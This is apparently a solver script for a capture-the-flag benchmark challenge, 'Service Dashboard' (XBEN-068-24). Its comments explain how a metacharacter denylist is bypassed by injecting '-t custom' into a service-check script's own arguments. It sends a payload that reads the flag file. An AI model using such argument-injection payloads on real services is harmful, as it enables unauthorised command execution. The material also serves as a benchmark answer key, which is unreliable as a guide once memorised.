#!/usr/bin/env bash
# XBEN-068-24 — "Service Dashboard" (tags: command_injection)
#
# The endpoint rejects `& | $ ; \n \r` and then interpolates what is left into
# `./check_service.sh {name}`. The filter is aimed at shell metacharacters, and
# it holds: none of them are needed. `check_service.sh` takes `-t custom
# "<command>"` and runs it, so the injection is into the *script's own argument
# parser*, using nothing but spaces, dashes and quotes.
#
# A denylist protects the shell it was written for and not the program behind
# it. That is the whole finding, and it is why the payload here looks like
# ordinary usage.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben068-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The page posts JSON to this endpoint from script; composing it here is one
# edit rather than a page interaction, and `--create` builds the JSON body on a
# request that had none.
REPLAY="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/check_service' \
    --set 'json.service_name=-t custom "cat /app/FLAG.txt"' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
